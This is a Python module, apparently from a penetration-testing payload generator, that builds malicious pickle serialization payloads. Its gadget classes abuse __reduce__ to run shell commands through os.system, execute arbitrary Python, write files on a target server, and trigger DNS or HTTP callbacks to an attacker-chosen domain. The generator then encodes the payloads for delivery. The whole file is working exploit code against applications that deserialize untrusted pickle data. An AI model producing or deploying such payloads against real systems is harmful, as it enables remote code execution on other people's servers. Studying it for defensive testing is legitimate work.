
import os
import logging
import urllib.parse
import base64
import importlib.util
import socket
import urllib.request
from .serializer import Serializer

class PickleSystemCommand:

    def __init__(self, cmd):
        self.cmd = (cmd)
        
    def __reduce__(self):
        return os.system, (self.cmd,)
    

class PickleCode:

    def __init__(self, code):
        self.code = code
        
    def __reduce__(self):
        pass
        return exec, (self.code,)
    
class PickleDNS:

    def __init__(self, hostname):
        self.hostname = hostname 

    def __reduce__(self):
        return socket.getaddrinfo, (self.hostname, 0,)
    
class PickleHttpGet:

    def __init__(self, url):
        self.url = url
        
    def __reduce__(self):
        return urllib.request.urlopen, (self.url,)
    
class PickleFileWrite(PickleCode):

    def __init__(self, args):
        file = args[0:args.index(';')]
        content = args[args.index(';')+1:]
        super().__init__(f"""
f = open("{file}", "w")
f.write("{content}")
f.close()""")
    
class Pickle(Serializer):

    gadgets = []

    def __init__(self, args):
        super().__init__('', args)
        self.gadgets.append({
            'id': 'PickleSystemCommand',
            'name': 'PickleSystemCommand',
            'description': 'PickleSystemCommand: <system_command>',
            'format': '<system_command>'
        })
        self.gadgets.append({
            'id': 'PickleCode',
            'name': 'PickleCode',
            'description': 'PickleCode: <code>',
            'format': '<code>'
        })
        self.gadgets.append({
            'id': 'PickleDNS',
            'name': 'PickleDNS',
            'description': 'PickleDNS: <domain>',
            'format': '<domain>'
        })
        self.gadgets.append({
            'id': 'PickleHttpGet',
            'name': 'PickleHttpGet',
            'description': 'PickleHttpGet: <url>',
            'format': '<url>'
        })
        self.gadgets.append({
            'id': 'PickleFileWrite',
            'name': 'PickleFileWrite',
            'description': 'PickleFileWrite: <remote_file>;<content>',
            'format': '<remote_file>;<content>'
        })


    def exists(self):
        spam_spec = importlib.util.find_spec("pickle")
        if spam_spec is None:
            logging.error("pickle module does not exists")
            return False
        else:
            return True
        
    
    def chains(self):
        return self.gadgets

    def payload(self, chainName, chainArgs):
        import pickle
        if not chainName in globals():
            logging.error(f"[{chainName}] Undeclared class {chainName} in globals")
            return None
        
        className = globals()[chainName]
        logging.debug(f"[{chainName}] Dumping pickle byte code for object {className}(\"{chainArgs}\")")
        object = className(chainArgs)
        return pickle.dumps(object, protocol=pickle.HIGHEST_PROTOCOL)
    

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        py_code = self.getFileContentOrCode(self.chainOpts.python_code)
        remote_file_to_write = self.chainOpts.remote_file_to_write
        remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else py_code
    
        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")
        logging.info(f"Python Code: {self.chainOpts.python_code}")
        logging.info(f"File written on remote server: {remote_file_to_write}")
        logging.info(f"Content written on server: {remote_content}")

        logging.info(f"Generating payloads...")

        # generate payload for each chain
        count = 0
        for chain in chains:

            format = chain['format']

            if ('<url>' in format or '<domain>' in format) and not interact_domain:
                logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
                continue

            logging.info(f"[{chain['name']}] Generating payload")

            chain_system_command = system_command
            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
            escaped_chain_system_command = chain_system_command.replace("'", "\\'")

            chain_py_code = py_code
            chain_py_code = chain_py_code.replace('%%system_command%%', escaped_chain_system_command)
            chain_py_code = chain_py_code.replace('%%domain%%', str(interact_domain))
            chain_py_code = chain_py_code.replace('%%chain_id%%', chain['id'])

            chain_remote_content = remote_content
            chain_remote_content = chain_remote_content.replace('%%system_command%%', escaped_chain_system_command)
            chain_remote_content = chain_remote_content.replace('%%domain%%', str(interact_domain))
            chain_remote_content = chain_remote_content.replace('%%chain_id%%', chain['id'])

            chainArguments = format
            chainArguments = chainArguments.replace('<system_command>', chain_system_command)
            chainArguments = chainArguments.replace('<code>', chain_py_code)
            chainArguments = chainArguments.replace('<domain>', str(interact_domain))
            chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
            chainArguments = chainArguments.replace('<remote_file>', remote_file_to_write.replace('%%ext%%', 'py'))
            chainArguments = chainArguments.replace('<content>', chain_remote_content)
            

            payload = self.payload(chain['name'], chainArguments)

            if payload is None:
                logging.error(f"[{chain['name']}] Failed to create payload")
                continue

            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

            if self.chainOpts.base64:
                payload = base64.b64encode(payload)
            elif self.chainOpts.base64_urlsafe:
                    payload = base64.urlsafe_b64encode(payload)
            
            if self.chainOpts.url:
                payload = urllib.parse.quote_plus(payload).encode('ascii')
            
            self.output(chain['id'], payload+b"\n")
            count = count + 1
                
        return count